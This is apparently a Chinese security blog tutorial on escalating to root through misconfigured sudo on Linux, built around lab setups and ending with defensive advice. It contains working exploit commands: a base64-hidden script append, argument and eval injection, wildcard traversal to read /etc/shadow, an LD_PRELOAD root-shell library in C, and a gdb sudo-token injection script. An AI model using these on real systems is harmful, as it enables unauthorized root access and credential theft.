---
title: "sudo相关提权思路"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# sudo相关提权思路

sudo（super user do）是linux系统中用于管理用户权限的工具，允许普通用户在无需切换到超级用户的情况下以root身份执行命令，通常，在使用sudo命令时，用户需要输入自己的密码验证自己是否有权限使用，如果没有权限，会告知用户：该用户不在sudoers文件中，这个事件将会被报告

如果sudo配置不当，可能导致安全隐患

### 一、sudo权限分配不当

当配置普通用户sudo权限时，设置了免密的sudo用户，即该用户不需要输入口令即可执行特权命令

我们通常使用如下命令查看当前sudo权限：

~~~shell
sudo -l
~~~

而有一部分命令如果能免密执行，则可以进行权限提升的利用，这也是我们常说的sudo提权

sudo的基本利用思路有如下几种： 

* **免密使用sudo权限执行某些命令，重新获取一个root身份的shell**
* **某些工具允许免密sudo运行，且能够运行脚本/配置文件，可以修改脚本/配置文件实现获取一个root身份的shell**
* **免密使用sudo权限执行某些命令，获取/etc/shadow第一行root的密码哈希，再进行爆破获取明文密码**
* **免密使用sudo权限执行某些命令，用新的root密码哈希覆盖掉原本的/etc/shadow**

（思路选择的推荐度按序降低，越靠后的思路，对主机造成的影响越大）

由于能利用的场景太多，这里不作赘述，**利用命令均可在这个网站上查询**：[GTFOBins](https://gtfobins.github.io/)

可以参考文章学习：[Linux提权之Sudo 70种提权方法](https://www.huangmj.com/17116743651246.html)

### 二、sudo脚本篡改提权

另一种情况，管理员可能会将某个shell脚本设置为sudo免密执行，如果低权限用户对该文件可写，那么我们可以将提权代码写入该文件，实现权限提升。我们配置如下场景（实验环境为centos 7）：

* 首先以root身份配置：

  ~~~shell
  groupadd yuy0ung  
  # 创建一个名为 yuy0ung 的新组
  
  useradd -d /home/yuy0ung -m yuy0ung -g yuy0ung -s /bin/bash -p 123456  
  # 添加用户 yuy0ung，指定主目录为 /home/yuy0ung，若不存在则创建；设置默认 shell 为 /bin/bash；设置组为 yuy0ung；设定密码为 123456
  
  mkdir -p ~yuy0ung/demo  
  # 创建目录 /home/yuy0ung/demo，若上级目录不存在，则一并创建
  
  chown yuy0ung:yuy0ung ~yuy0ung/demo  
  # 将目录 /home/yuy0ung/demo 的所有者和所属组更改为 yuy0ung
  
  chmod a+x ~yuy0ung/demo  
  # 为所有用户增加 /home/yuy0ung/demo 目录的执行权限
  
  echo "yuy0ung ALL=(root) NOPASSWD:/home/yuy0ung/demo/shell.sh" >> /etc/sudoers  
  # 允许 yuy0ung 用户在不输入密码的情况下以 root 身份执行 /home/yuy0ung/demo/shell.sh 脚本，将此配置追加到 /etc/sudoers 文件中
  ~~~

* 然后切换到yuy0ung：

  ```shell
  su yuy0ung
  
  # 创建一个新的shell脚本文件，并添加shebang行，表示该文件将使用bash来解释
  echo '#!/bin/bash' >> /home/yuy0ung/demo/shell.sh
  
  # 在刚才创建的shell脚本文件中添加一行命令，用于显示系统中所有进程的信息
  echo "ps aux" >> /home/yuy0ung/demo/shell.sh
  
  # 修改脚本文件的权限，使其具有可执行权限
  chmod +x /home/yuy0ung/demo/shell.sh
  ```


接下来进入场景：我们现在刚获取这个yuy0ung身份的shell，准备尝试权限提升

首先查看sudo权限：

~~~shell
sudo -l
~~~

![image-20240716220724865](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240716220724786-2078888943.png)

我们发现`/home/yuy0ung/demo/shell.sh`可以免密执行sudo

再查看该脚本所在目录的权限：

~~~shell
ls -al /home/yuy0ung/demo/
~~~

![image-20240716221531332](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240716221531441-19375503.png)

我们拥有该文件夹的所有权限，则可以向`/home/yuy0ung/demo/shell.sh`中夹带点私货：

~~~shell
echo d2hvYW1pCnN1IC0K |base64 -d >> /home/yuy0ung/demo/shell.sh
# 在shell.sh结尾添加了两行命令：whoami和su -
~~~

看看脚本的权限，如果没有执行权限记得添加：

~~~shell
ls -al /home/yuy0ung/demo/shell.sh

#如果没有执行权限
chmod +x /home/yuy0ung/demo/shell.sh
~~~

![image-20240716222430692](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240716222430625-819980486.png)

没有问题了，免密sudo执行脚本：

~~~shell
sudo /home/yuy0ung/demo/shell.sh
~~~

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240716222716824-242402172.png" alt="image-20240716222717259" style="zoom:150%;" />

提权成功

### 三、sudo脚本参数提权

当我们发现了有sudo权限的脚本，但我们并没有修改权限的时候，可以试试阅读脚本代码，判断脚本是否允许带参数执行，如果脚本允许带参数执行并且参数可控，我们可以利用该缺陷来进行权限提升

我们可以配置如下场景（CentOS 7），以root身份执行命令：

~~~shell
echo IyEvYmluL2Jhc2gKJHsxfS9sb2cuc2g= |base64 -d > /var/www/log.sh
# 写入脚本内容var

chown root:root /var/www/log.sh
# 将目录 /var/www/log.sh 的所有者和所属组更改为 yuy0ung

chmod a+x /var/www/log.sh
# 为所有用户增加 /var/www/log.sh 目录的执行权限

echo "yuy0ung ALL=(root) NOPASSWD:/var/www/log.sh" >> /etc/sudoers  
# 允许 yuy0ung 用户在不输入密码的情况下以 root 身份执行 /var/www/log.sh 脚本，将此配置追加到 /etc/sudoers 文件中

chmod 755 /var/www/log.sh
# 修改/var/www/log.sh的权限，允许用户yuy0ung执行
~~~

切换用户到yuy0ung，接下来进入场景：我们现在刚获取这个yuy0ung身份的shell，准备尝试权限提升

* 老规矩，先查看sudo配置：

  ~~~shell
  sudo -l
  ~~~

  ![image-20240718002023828](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718002024652-1975367287.png)

  我们发现`/var/www/log.sh`具有免密sudo权限

* 查看该目录下文件权限：

  ~~~shell
  ls -al /var/www/
  ~~~

  ge-20240718002341693](https://img2023.cnblogs.com/blog/3450279/202407/3450279-20240718002342169-1658163908.png)

  我们发现yuy0ung对该文件只有可读可执行权限，没有可写权限，所以无法进行sudo脚本篡改提权。

* 我们查看一下脚本内容：

  ~~~shell
  cat /var/www/log.sh
  ~~~

  ![image-20240718003739915](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718003740167-2098692339.png)

  可见脚本内容为：

  ~~~shell
  #!/bin/bash
  ${1}/log.sh
  ~~~

  这里很明显，脚本中的参数`${1}`是可控的，运行脚本时，输入的第一段字符串会赋值给该参数，并执行对应目录的log.sh脚本文件

  因此，我们可以找一个我们可写的目录，在其中写入一个我们自定义的log.sh，再控制`/var/www/log.sh`去执行另一个log.sh，即可实现权限提升

* 执行如下命令，在`/tmp/`目录写入一个用于权限提升（内容为打开一个BashShell）的log.sh：

  ~~~shell
  echo "/bin/bash" > /tmp/log.sh
  ~~~

  ![image-20240718005235854](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718005236406-1421944661.png)

* 赋予该脚本文件所有权限：

  ~~~shell
  chmod 777 /tmp/log.sh
  ~~~

  ![image-20240718005517757](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718005518195-1270521358.png)

* sudo运行`/var/www/log.sh`，间接运行`/tmp/log.sh`：

  ~~~shell
  sudo /var/www/log.sh "/tmp"
  ~~~

  ![image-20240718005903224](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718005903656-1415968090.png)

  成功实现权限提升

这种权限提升情况比较特殊，需要根据脚本内容进行应变，可以再看看下面两个sudo脚本进行练习：

* 脚本1：

  ~~~sh
  #!/bin/bash
  set -x
  if [ $1 = "aaa" ];then
      eval $cmd
      exit $?
  fi
  ~~~

  利用：

  ~~~shell
  sudo /var/www/log.sh aaa "su -"
  # 利用脚本免密切换至root
  ~~~

  ![image-20240718014925077](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718014925605-189238632.png)

* 脚本2：

  ~~~sh
  #!/bin/bash
  set -x
  if [ $1 = "aaa" ];then
      chown yuy0ung:yuy0ung $2/log.sh
  fi
  ~~~

  利用：

  ~~~sh
  sudo ./2.sh aaa "/etc/shadow "
  chmod 777 /etc/shadow
  cat /etc/shadow
  # 利用脚本读取shadow文件
  ~~~

  ![image-20240718012317919](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718012318486-1614597211.png)

脚本的利用方式是多样的，这里仅供参考

### 四、sudo绕过路径

若管理员在配置sudoers文件时使用了通配符，这种情况很可能被利用来绕过sudo的限制

~~~shell
echo "yuy0ung ALL=(root) NOPASSWD:/bin/less /home/yuy0ung/*" >> /etc/sudoers  
# 允许 yuy0ung 用户在不输入密码的情况下以 root 身份执行 /bin/less /home/yuy0ung/* ，将此配置追加到 /etc/sudoers 文件中
~~~

这里看似是免密sudo执行less来查看`/home/yuy0ung`下的任何文件，但这里是可以进行目录穿越的：

~~~shell
sudo less /home/yuy0ung/../../etc/shadow
~~~

如此，可以免密sudo用less查看`/etc/shadow`：

![image-20240718213543554](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718213543285-1744060463.png)

成功查看：

![image-20240718213443775](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240718213443717-680993685.png)

### 五、sudo LD_PRELOAD环境变量提权

#### LD_PRELOAD

LD_PRELOAD预加载是一个环境变量，主要用来设置共享对象文件的路径，以便程序在运行时加载动态链接库。

类似于windows加载dll的方式，一般情况下，共享库的加载顺序如下：

>* 在库搜索前，先加载LD_PRELOAD环境变量中指定的库
>* 编译代码时，使用-Wl、-rpath指定的动态库搜索路径
>* 加载LD_LIBRARY_PATH环境变量中指定的共享库
>* 加载/etc/ld.so.conf文件中所指定的动态库搜索路径
>* 加载/etc/ld.so.cache文件中所缓存的共享库
>* 加载/usr/lib/或/usr/lib64/目录中的共享库

可见LD_PRELOAD 环境变量的加载级别最高。当应用程序启动时，渗透测试人员可以通过对 LD_PRELOAD 环境变量的控制来让程序优先加载一个自己创建的后门共享库，从而达到权限提升的目的

使用 LD_PRELOAD 进行权限提升需要满足几个条件：

* 被劫持的命令或程序必须具有较高的权限
* 在 /etc/sudoers 文件中定义了 `env_keep+=LD_PRELOAD`
* 允许编辑 LD_PRELOAD 环境变量

在 Linux 系统中，当用户使用 sudo 命令以提升后的权限执行命令时，系统会**重新加载环境变量**

`env_keep+=LD_PRELOAD` 是 sudoers 文件中的一条参数，如果在 sudoers 文件中添加了此参数，则当用户使用 sudo 执行命令时，系统会保留 LD_PRELOAD 环境变量，而不会将其重置。

在实际渗透测试过程中，为防止程序崩溃，最稳妥的利用方式是重写一个正常的库文件，并在其中定义原库文件中的函数及后门函数。

#### 利用步骤

演示主机为ubuntu 16.04.1

##### 环境配置

* 首先以root身份在/etc/sudoer中添加`env_keep+=LD_PRELOAD`：

![image-20240727161108083](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727161108686-1160307734.png)

* 再添加一个sudo配置，我这里添加的是apache2：

  ![image-20240727162219205](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727162220436-540612903.png)

  ok切换到普通用户yuy0ung准备复现

##### 利用

* 查看sudo配置：

  ![image-20240727162513390](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727162514308-592075090.png)

  apache2可以免密sudo，这里其实可以利用apache2显示`/etc/shadow`的内容再进行密码爆破，但注意到 `env_keep+=LD_PRELOAD`，即保留当前LD_PRELOAD环境变量，那么就有个更好的思路：**可以通过创建一个以root权限启动BashShell 为内容的共享库，在使用sudo命令启动 apache2 服务时加载此共享库来进行提权**

* 编写c文件：

  ~~~c
  #include<stdio.h>
  #include<sys/types.h>
  #include<stdlib.h>
  void _init(){
  	unsetenv("LD_PRELOAD"); //不让环境变量重置,保持使用现在的共享库
  	setresuid(0,0,0);
  	system("/bin/bash -p");
  }
  ~~~

  ![image-20240727163340902](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727163342140-169531631.png)

* gcc编译为shell.so，且不使用默认的启动文件:

  ~~~shell
  gcc -shared -fPIC -o shell.so shell.c -nostartfiles
  ~~~

  ![image-20240727173922774](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727173923365-1575294673.png)

* 执行命令启动apache2并加载LD_PRELOAD中的自定义库：

  ~~~shell
  sudo LD_PRELOAD=/tmp/shell.so apache2
  ~~~

  <img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240727173941063-1017736037.png" alt="image-20240727173940655" style="zoom:150%;" />

  成功提权

### 六、利用sudo caching提权

sudo caching是一种用于提高命令执行效率的技术

用户第一次使用sudo命令时，系统会提示用户输入密码，然后将用户的身份验证信息缓存起来，通常在 15 分钟内（可以通过在配置文件中修改 `timestamp_timeout` 参数来修改缓存时间）。用户在此时间内无需再次输入密码就可以执行 sudo 命令，从而提高效率。不过，sudo 缓存也有一些安全风险。如果渗透测试人员能够获得此用户的权限，那么在 sudo 缓存时间内，他们就可以无须输入密码执行sudo命令，从而获得更高的权限

sudoers文件中有三个参数与之有关，分别是 `!authenticate`、`timestamp_timeout=-1` 和 `!tty_tickets`：

* `authenticate` 参数用于配置使用 sudo 命令时是否需要输入密码。如果启用了 `authenticate` 参数，则用户在使用 sudo 命令时需要输入密码；如果禁用了 `authenticate` 参数，则用户在使用 sudo 命令时无需输入密码。当在参数前添加符号“!”时，表示该参数被禁用

* `timestamp_timeout` 参数用于设置在使用 sudo 命令时的超时时间。如果设置了 `timestamp_timeout` 参数，则在指定的时间间隔内，用户无需再次输入密码即可使用 sudo 命令。当 `timestamp_timeout` 参数设置为 -1 时，意味着用户在当前终端窗口**永远不需要输入密码**

* `tty_tickets` 参数用于启用或禁用 TTY（teletype，终端）票据功能。如果启用了 TTY 票据功能，则用户在每个终端上执行 sudo 命令时都需要输入密码如果禁用了 TTY 票据功能，则用户在使用 sudo 命令时只需要输入一次密码，在其他终端中无需再输入

如果当前系统的 sudoers 配置文件中有以上三种中的任意一个参数，那么渗透测试人员就有可能无需输入密码即可执行 sudo 命令，从而完成权限提升

### 七、sudo令牌进程注入提权

思路与利用脚本来源于github项目[nongiach/sudo_inject: [Linux] Two Privilege Escalation techniques abusing sudo token (github.com)](https://github.com/nongiach/sudo_inject)

当用户使用 sudo 执行命令后，会在 `/var/run/sudo/ts` 目录中创建一个带有用户名的时间戳文件。此文件包含有关用户身份验证成功或失败的信息。sudo 程序使用此信息来跟踪已通过身份验证的进程，以便在需要时提供适当的权限

Linux 系统在文件 `/proc/sys/kernel/yama/ptrace_scope` 中配置了用于控制进程追踪（Process Tracing）的权限，如图 9-76 所示。进程追踪是一种调试技术，它允许一个进程检查和控制另一个进程的执行

- 当文件内容为 0 时，允许所有进程被追踪；
- 当文件内容为 1 时，只允许父进程对子进程进行追踪；
- 当文件内容为 2 时，禁止所有进程被追踪。

如果当前系统的 `ptrace_scope` 值设置为 0，并且此时有用户使用 sudo 来执行命令，则可以尝试激活 `/var/lib/sudo/ts/` 目录下的所有 sudo 会话的令牌，注入具有有效 sudo 令牌的进程并激活我们自己的 sudo 令牌

#### 利用步骤

##### 环境配置

首先以root身份配置`/proc/sys/kernel/yama/ptrace_scope`：

~~~shell
echo 0 > /proc/sys/kernel/yama/ptrace_scope
# 这个设置在重启之后会自动失效
~~~

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240728025027995-2142195635.png" alt="image-20240728025027395" style="zoom:150%;" />

切换到普通用户yuy0ung完成配置

##### 利用

* 为了方便实验，我直接将脚本全部下载至/tmp目录了：

![image-20240728025254396](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240728025254682-1101514922.png)

* 全部赋予权限：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240728030146193-118866214.png" alt="image-20240728030145943" style="zoom:150%;" />

* 开始利用

  首先是第一个利用脚本：

  ~~~sh
  #!/bin/sh
  
  # create an invalid sudo entry for the current shell
  echo | sudo -S >/dev/null 2>&1
  echo "Current process : $$"
  cp activate_sudo_token /tmp/
  chmod +x activate_sudo_token
  # timestamp_dir=$(sudo --version | grep "timestamp dir" | grep -o '/.*')
  # inject all shell belonging to the current user, our shell one :p
  for pid in $(pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$' -u "$(id -u)" | grep -v "^$$\$")
  do
          echo "Injecting process $pid -> "$(cat "/proc/$pid/comm")
          echo 'call system("echo | sudo -S /tmp/activate_sudo_token /var/lib/sudo/ts/* >/dev/null 2>&1")' \
                  | gdb -q -n -p "$pid" >/dev/null 2>&1
  done
  ~~~

  分步骤解释一下：

  * 使用 `sudo -S` 创建一个无效的 sudo 时间戳项，以阻止 `sudo` 缓存当前 shell 的 sudo 令牌，从而确保脚本后续操作不会导致密码请求

  * 打印当前脚本的进程 ID（PID）

  * 将 `activate_sudo_token` 程序复制到 `/tmp/` 目录并赋予可执行权限

  * 使用 `pgrep` 查找当前用户下的所有 Shell 进程（如 `bash`、`zsh` 等），并排除当前脚本进程

  * 对于每一个找到的 Shell 进程，打印进程信息，然后利用 `gdb` 注入一个命令，通过 `system` 调用来执行 `activate_sudo_token`，并将 sudo 时间戳目录下的所有文件作为参数传入，所有输出都被重定向到 `/dev/null`

  这段代码的效果是，在执行sudo命令时需要输人密码的情况下调用`/tmp/activate_sudo_token`程序，注入所有正在运行的Shell进程中，并传入`/var/lib/sudo/ts/`目录下，所有文件的路径为此程序参数，并且不会有其他输出，直到寻找到有效的sudo令牌进程，最后使用此sudo命令激活当前进程

* 这里需要**另起一个终端sudo**执行一下命令并输入密码，这也是利用的条件之一：

  ![image-20240728030005612](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240728030006157-1384522601.png)

* 接下来执行脚本文件进行利用：

  在脚本完成注入后执行`sudo -i`即可完成提权
  ![image-20240728030406709](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240728030407021-1364430602.png)

  成功获得root权限

同理，上面提到的github项目还有其他利用脚本，需要的可以自行阅读，这里不再赘述

### 八、如何防御？

对症下药：

* 确保sudo权限分配正确，不被滥用
* 对sudo命令调用的自定义脚本的读写权限进行严格控制
* 尽量不在sudoers文件中使用通配符进行路径配置
* 关闭sudo缓存
* 正确配置ptrace_scope文件
